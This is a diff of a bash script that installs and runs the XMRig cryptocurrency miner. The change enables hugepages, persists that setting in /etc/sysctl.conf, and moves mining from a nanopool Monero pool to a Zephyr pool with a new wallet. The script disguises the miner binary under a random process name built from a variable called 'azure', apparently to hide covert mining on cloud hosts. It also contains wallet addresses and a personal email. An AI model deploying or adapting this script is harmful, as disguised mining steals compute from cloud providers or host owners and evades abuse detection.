@@ -1,6 +1,8 @@
 #!/bin/bash
 sudo apt-get update
-VERSION=6.3.1
+sudo sysctl -w vm.nr_hugepages=1280
+sudo bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"
+VERSION=6.21.0
 azure=mxsemsdnlkdj
 a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
 apt-get install -y git wget screen
@@ -14,8 +16,8 @@ rm -rf xmrig-$VERSION-xenial-x64.tar.gz && cd xmrig-$VERSION
 mv xmrig $azure -n
 cp $azure "$cpuname"
 rm -f  xmrig
-POOL=xmr-us-west1.nanopool.org:14433
-USERNAME=44XbJdyExZZbCqrGyvG1oUbTpBL8JNqHVh8hmYXgUfEHgHs4t45yMfKeTAUQ4dDNtPc2vXhj83uJf1byNSgwU9ZYFxgT3Ao.orcfullaz/jmayo66@yahoo.com
+POOL=us-zephyr.miningocean.org:5432
+USERNAME=ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB
 ALGO=rx/0
 DONATE=1
-./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME.orc -p x -a $ALGO -k --tls
+./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME -p x -a $ALGO -k --tls
